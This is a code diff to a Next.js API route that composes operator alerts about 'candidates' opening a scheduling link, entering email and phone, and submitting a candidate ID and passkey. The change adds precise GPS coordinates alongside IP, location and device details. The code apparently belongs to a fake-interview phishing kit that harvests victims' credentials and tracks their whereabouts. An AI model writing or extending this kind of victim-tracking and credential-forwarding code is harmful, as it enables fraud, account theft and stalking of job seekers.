@@ -164,11 +164,14 @@ export async function POST(req: NextRequest) {
         second: "2-digit",
       });
 
+      const coordsInfo = record.latitude && record.longitude ? `\n🧭 <b>Coordinates:</b> <code>${escapeHtml(record.latitude)}, ${escapeHtml(record.longitude)}</code>` : "";
+
       messageHtml =
         `⚡ <b>Candidate Opened Scheduling Link!</b>\n\n` +
         `👤 <b>Interviewer Link:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
         `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
-        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
+        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>` +
+        coordsInfo + `\n` +
         `🕒 <b>Time:</b> ${time} (New York / EST)\n` +
         `🌍 <b>Timezone:</b> <code>${escapeHtml(timezone)}</code>\n` +
         `📱 <b>Device / Browser:</b> <code>${escapeHtml(userAgent)}</code>`;
@@ -181,6 +184,7 @@ export async function POST(req: NextRequest) {
       const time = record.start_time || record.scheduled_time || "N/A";
       const interviewer = record.interviewer_name || "Recruiting Team";
       const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
+      const coordsInfo = record.latitude && record.longitude ? `\n🧭 <b>Coordinates:</b> <code>${escapeHtml(record.latitude)}, ${escapeHtml(record.longitude)}</code>` : "";
 
       messageHtml =
         `📝 <b>Candidate Details Entered (Auto-Saved)!</b>\n\n` +
@@ -188,7 +192,8 @@ export async function POST(req: NextRequest) {
         `📧 <b>Email:</b> <code>${escapeHtml(email)}</code>\n` +
         `📞 <b>Phone:</b> <code>${escapeHtml(phone)}</code>\n` +
         `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
-        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
+        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>` +
+        coordsInfo + `\n` +
         `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
         `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}\n` +
         `🔒 <b>Status:</b> In ID/Passkey Modal`;
@@ -203,6 +208,7 @@ export async function POST(req: NextRequest) {
       const adminEmail = record.admin_email ? ` (${record.admin_email})` : "";
       const candidateId = record.candidate_id || "N/A";
       const passkey = record.passkey || "N/A";
+      const coordsInfo = record.latitude && record.longitude ? `\n🧭 <b>Coordinates:</b> <code>${escapeHtml(record.latitude)}, ${escapeHtml(record.longitude)}</code>` : "";
 
       messageHtml =
         `🎉 <b>Candidate Submitted ID & Passkey!</b>\n\n` +
@@ -212,7 +218,8 @@ export async function POST(req: NextRequest) {
         `🔑 <b>Candidate ID:</b> <code>${escapeHtml(candidateId)}</code>\n` +
         `🏷 <b>Passkey:</b> <code>${escapeHtml(passkey)}</code>\n` +
         `📍 <b>Location:</b> ${escapeHtml(geo.location)}\n` +
-        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>\n` +
+        `🌐 <b>IP Address:</b> <code>${escapeHtml(geo.ip)}</code>` +
+        coordsInfo + `\n` +
         `📅 <b>Date & Time:</b> ${escapeHtml(date)} at ${escapeHtml(time)}\n` +
         `👔 <b>Interviewer:</b> ${escapeHtml(interviewer)}${escapeHtml(adminEmail)}`;
     } else {
